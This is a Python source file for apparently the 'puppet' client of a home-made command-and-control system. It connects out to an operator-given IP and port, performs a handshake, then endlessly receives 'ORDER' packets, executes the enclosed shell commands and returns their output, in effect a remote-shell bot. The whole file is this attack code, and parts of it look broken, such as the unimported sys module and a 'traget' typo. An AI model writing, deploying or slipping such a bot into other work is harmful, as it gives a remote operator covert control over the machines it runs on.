# Main source of the puppet connection
import socket
import time
import threading
from mcp import * 

def execute(packet):
    order, args = packet.args["order"].split(" ", 1)
    stdout, stderr = execCommand(args)
    if stderr:
        return McpBruh(stderr)
    else:
        return McpYeah(stdout)

def handleOrder(buffer, order):
    stdout, stderr = order.execute() 
    if stderr:
        buffer.sendPacket(McpBruh(stderr))
    else:
        buffer.sendPacket(McpYeah(stdout))

class MOP():
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        s = socket.socket()
        s.connect((self.ip, self.port))
        buffer = McpBuffer(s)

        # start handshake with hey
        hey = McpHey()
        buffer.sendPacket(hey)

        # recv welcome packet
        packet = buffer.nextPacket()

        print("I'm now puppet", packet.args["id"], "waiting for incoming tasks...")
        while True:
            order = buffer.nextPacket()
            if order.method == "ORDER":
                print("Recvd order", order)
                result = execute(order)
                print("Executed", result)

                buffer.sendPacket(result)
                #threading.Thread(traget=handleOrder, daemon=True, args=(buffer, packet)).start()
            else:
                print("WTF", order)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <ip> <port>")
        sys.exit(1)

    mop = MOP(sys.argv[1], int(sys.argv[2]))
    mop.start()
